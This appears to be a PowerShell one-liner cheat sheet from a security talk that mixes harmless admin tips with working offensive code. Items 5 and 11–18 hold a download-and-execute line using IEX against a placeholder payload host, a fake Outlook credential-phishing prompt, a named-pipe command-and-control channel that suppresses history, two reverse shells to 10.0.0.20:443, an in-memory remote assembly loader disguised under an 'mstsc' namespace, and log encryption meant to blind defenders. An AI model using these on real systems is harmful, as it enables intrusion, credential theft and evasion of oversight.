# 1. Text to speech + potential exfil data via audio/console beep
(new-Object -ComObject sapi.spvoice).speak("hey everyone")
(new-Object -ComObject sapi.spvoice).speak($(cat c:\temp\speak.txt))
[console]::beep(440,1000)

# 2. Lots of functionality; Minimum syntax; Living off the land
# e.g. Crash a Ryzen system in single line of tweetable PowerShell - https://twitter.com/aionescu/status/1393798004151181312
(Get-NtFile \Device\NTPNP_PCI0031).DeviceIoControl(0x9C402400, 5, 5)

# 3. Pipe ip addresses, curl (get ipinfo), convert from JSON, open in ad-hoc Grid
$IPs = "151.101.17.67", "192.12.94.30", "192.26.92.30"
$IPs | foreach {curl ipinfo.io/$_/json | ConvertFrom-Json} | ogv

# 4. What the hex?!
Format-Hex C:\Temp\disk.exe| more
"GUID" | format-hex
Format-Hex C:\Temp\disk.exe| sls '47 55 49 44'

# 5. Invoke/execute any text stream
"gwmi win32_Bios" | IEX
IEX (new-object net.webclient).downloadstring("http://myserver.com/payload.htm")
curl http://myserver.com/payload.htm | IEX
# note: See session presentation for more options & code

# 6. Randomize stuff
Get-Random -InputObject (cat C:\temp\words.txt) 
Get-Random -InputObject (cat C:\temp\words.txt) -SetSeed 1 
Get-Random -InputObject (cat C:\temp\words.txt) -SetSeed 2 -Count 3
Get-Random -Minimum 1 -Maximum 100

# 7. cool output/selection
gcm prompt | select -ExpandProperty definition
function prompt {$host.ui.RawUI.WindowTitle=pwd;"$(get-date)>"}
ps | Out-GridView -OutputMode Multiple
ps | Out-ConsoleGridView # (might need to add the module ->  install-Module Microsoft.PowerShell.ConsoleGuiTools)

# 8. Harness the power of .net
[Net.WebUtility]::UrlEncode("/insider profiles/")
[math]::Round(89.887,1)
[char]::IsPunctuation("!")
[console]::CapsLock
("heLlo wOrld").ToCharArray() | % { [char]::IsUpper($_)}
[convert]::ToBase64String($([System.Text.Encoding]::Unicode.GetBytes("shutdown /r /t 0")))

# 9. compare anything to anything
compare (cat .\hosts.txt) (cat .\hosts2.txt)
compare (cat .\hosts.txt) (cat .\hosts2.txt) -IncludeEqual -ExcludeDifferent

# 10. convert any to any
ps explorer | ConvertTo-Json
ps explorer | ConvertTo-Csv # can add params, e.g -Delimiter "`t"
ps explorer | ConvertTo-Html # can utilize params such as -PreContent, -PostContent, -Body, -Head, -CssUri etc'
ps explorer | ConvertTo-Xml
ps explorer | Export-Clixml c:\temp\ps-explorer.xml
[System.BitConverter]::ToString($([io.file]::ReadAllBytes("c:\temp\file.exe")))

$b = [io.file]::ReadAllBytes("c:\temp\file.exe")
($b | foreach { $_.ToString("X2") }) -join ""

# 11. One liner Credential phishing
$c = $Host.ui.PromptForCredential("Microsoft Outlook","Please enter your credentials","$env:userdomain\$env:username","")
$c.GetNetworkCredential() | fl *

# 12. Named-Pipe/SMB One-liner (Exfil data/C2 with No socket bind)
#- Server stream
$pipe = new-object System.IO.Pipes.NamedPipeServerStream 'mypipe','Out'
$pipe.WaitForConnection()
$sw = new-object System.IO.StreamWriter $pipe
$sw.AutoFlush = $true
$sw.WriteLine("whoami")
#$sw.Dispose() # terminates the stream
#$pipe.Dispose()
#- Client stream
Set-PSReadLineOption -HistorySaveStyle SaveNothing
$pipe = new-object System.IO.Pipes.NamedPipeClientStream ’10.0.0.1','mypipe','In'
$pipe.Connect()
$sr = new-object System.IO.StreamReader $pipe
while (($data = $sr.ReadLine()) -ne $null) { iex $data }
#$sr.Dispose()
#$pipe.Dispose()

# 13. One-liner Rev Shell
#- nc -p 443 -l
$sm=(New-Object Net.Sockets.TCPClient('10.0.0.20',443)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}

#- client
$c=New-Object System.Net.Sockets.TCPClient('10.0.0.20',443);$st = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $st.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2  = $sb + 'PS ' + (pwd).Path + '> ';$sb1 = ([text.encoding]::ASCII).GetBytes($sb2);$st.Write($sb1,0,$sb1.Length);$st.Flush()};$c.Close()

# 14 + 15 -> There is no spoon...
# Invoke powershell code from binary (or url) without launching powershell.exe or the actual binary process itself
function global:Invoke-InMemory {
[CmdletBinding()]
Param(
[String]$Path,

[String]$EncodedPayload
)

$source = @"
using System;
using System.Net;
using System.Reflection;

namespace mstsc
{
    public static class csharp
    {
        public static void LoadBinary(string url, string payload)
        {
        WebClient wc = new WebClient();
        Byte[] buffer = wc.DownloadData(url);
            var assembly = Assembly.Load(buffer);
var entry = assembly.EntryPoint;
var args = new string[2] {"-enc", payload};
var nothing = entry.Invoke(null, new object[] { args });
        }
    }
}
"@

if (-not ([System.Management.Automation.PSTypeName]'mstsc.csharp').Type)
{
    Add-Type -ReferencedAssemblies $Assem -TypeDefinition $source -Language CSharp
}
[mstsc.csharp]::LoadBinary($Path, $EncodedPayload)
}

# 16. Run C# directly 
$x = @'
public class test
{
    public static string Identity()
        {
            string Name = System.Security.Principal.WindowsIdentity.GetCurrent().Name; 
            return Name;
        }
}
'@

Add-Type $x;
[test]::Identity()

# 16b. Invoke local variables & functions in Remote sessions
$x = "my local var"
Invoke-Command -session (Get-PSSession)[0] -scriptblock {$using:x}

function Get-Hostname {"running on $env:ComputerName"}
Invoke-Command -session (Get-PSSession)[0] -scriptblock ${function:Get-Hostname}

# 17. Get objects from apps/tools - convert strings without RegEx
$ns = @'

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    {LocalAddress*:0.0.0.0}:{LocalPort:135}            {RemoteAddress:0.0.0.0}:{RemotePort:0}              {State:LISTENING}       {PID:1052}
  TCP    {LocalAddress*:192.168.43.141}:{LocalPort:63152}   {RemoteAddress:185.70.40.151}:{RemotePort:443}      {State:ESTABLISHED}     {PID:11360}
'@

netstat -ano | ConvertFrom-String -TemplateContent $ns | more
$net = netstat -ano | ConvertFrom-String -TemplateContent $ns
$net | ? state -eq "established"
$net | ConvertTo-Json # etc..

# 18. Use Protected Event Logging against the defense (need to create a Document Encryption cert first)
# before
Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-PowerShell/Operational'} -MaxEvents 1 | select -expandProperty message | more
# configure
New-Item "HKLM:\Software\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging" -Force
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging" -Name EnableProtectedEventLogging -Value 1
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging" -Name EncryptionCertificate -Value (dir Cert:\CurrentUser\my)[0].Thumbprint
# after (run some powershell commands first, to populate new events into Microsoft->Windows->Powershell->Operational event log
Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-PowerShell/Operational'} -MaxEvents 1 | select -expandProperty message | more

# 19. Invisi-shell
# https://github.com/YossiSassi/Invisi-Shell

# 20. JEA - Just Enough Access - Constrained remote access
# https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.2 

# 21. Sudo on windows
Function sudo {param([Parameter(Mandatory)][string]$FilePath,[Parameter(ValueFromRemainingArguments)][string[]]$ArgumentList) Start-Process @PSBoundParameters -Verb Runas}
sudo cmd "/k whoami /priv"